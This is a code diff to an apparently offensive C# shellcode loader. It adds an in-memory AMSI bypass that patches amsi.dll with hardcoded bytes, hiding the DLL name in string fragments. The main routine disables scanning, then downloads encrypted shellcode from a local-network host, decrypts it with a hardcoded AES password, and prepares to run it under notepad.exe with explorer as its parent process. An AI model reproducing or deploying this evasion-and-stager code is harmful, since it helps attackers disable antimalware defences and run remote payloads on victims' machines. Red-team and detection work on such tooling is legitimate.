@@ -74,6 +74,14 @@ public class Win32
 		QueryLimitedInformation = 0x00001000,
 		Synchronize = 0x00100000
 	}
+	[DllImport("kernel32")]
+	public static extern bool FreeLibrary(IntPtr hModule);
+	[DllImport("kernel32")]
+	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+	[DllImport("kernel32")]
+	public static extern IntPtr LoadLibrary(string name);
+	[DllImport("kernel32")]
+	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 	[DllImport("kernel32.dll")]
 	public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
 	[DllImport("kernel32.dll")]
@@ -113,7 +121,61 @@ public class Win32
         public static UInt32 PAGE_READWRITE = 0x04;
         public static int SW_HIDE = 0;
 }
+public class Evasion
+{
+	//ASB Patches
+	static byte[] amsix64 = new byte[] {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
+	static byte[] amsix86 = new byte[] {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18,0x00};
+	// EtwEventWrite Patches
 
+	public static void PatchAMS()
+	{
+		string dll1 = "am";
+		string dll2 = "si";
+		string dll0 = ".dll";
+		string dll = dll1 + dll2 + dll0;
+
+		if (IntPtr.Size == 8)
+		{
+			PatchMem(amsix64, dll, "DllGetClassObject", 0xcb0);
+		}
+		else
+		{
+			PatchMem(amsix86, dll, "DllGetClassObject", 0x970);
+			
+		}
+	}
+	private static void PatchMem(byte[] patch, string library, string function, Int64 offset = 0)
+	{
+		try
+		{
+			uint newProtect;
+			uint oldProtect;
+			// Get library address
+			IntPtr libPtr = Win32.LoadLibrary(library);
+			// Get Function address
+			IntPtr functionPtr = Win32.GetProcAddress(libPtr, function);
+			// Jump to the real function address if offset is used
+			if (offset != 0)
+			{
+				functionPtr = new IntPtr(functionPtr.ToInt64() + offset);
+			}
+			// Change memory permissions to XRW
+			Win32.VirtualProtect(functionPtr, (UIntPtr)patch.Length, 0x40, out oldProtect);
+			// Patch function
+			Marshal.Copy(patch, 0, functionPtr, patch.Length);
+			// Restore memory permissions
+			Win32.VirtualProtect(functionPtr, (UIntPtr)patch.Length, oldProtect, out newProtect);
+			Win32.FreeLibrary(libPtr);
+
+		}
+		catch (Exception e)
+		{
+			Console.WriteLine("[!] {0}", e.Message);
+			Console.WriteLine("[!] {0}", e.InnerException);
+		}
+	}
+}
 public class Decrypt
 {
         public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
@@ -229,7 +291,7 @@ public class Program
         {
                 WebClient wc = new WebClient();
                 wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64 blalalala)");
-                
+                // this header just another header
                 //ServicePointManager.Excpect100Continue = true;
                 // selects the version of tls to use
                 //ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
@@ -243,9 +305,10 @@ public class Program
         }
 	public static void Main(string[] args)
         {
+		Evasion.PatchAMS();
 		int parentProcessId = GetPid("explorer");
 		string binaryPath = @"C:\\Windows\\System32\\notepad.exe";
-		string url = "http://192.168.1.2:8888/shellcode.bin_enc";
+		string url = "http://192.168.1.4:8888/shellcode.bin_enc";
 		byte[] shellcode = downloader(url);
 		byte[] password = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("DtGvFck#"));
 		shellcode = Decrypt.AES_Decrypt(shellcode, password);
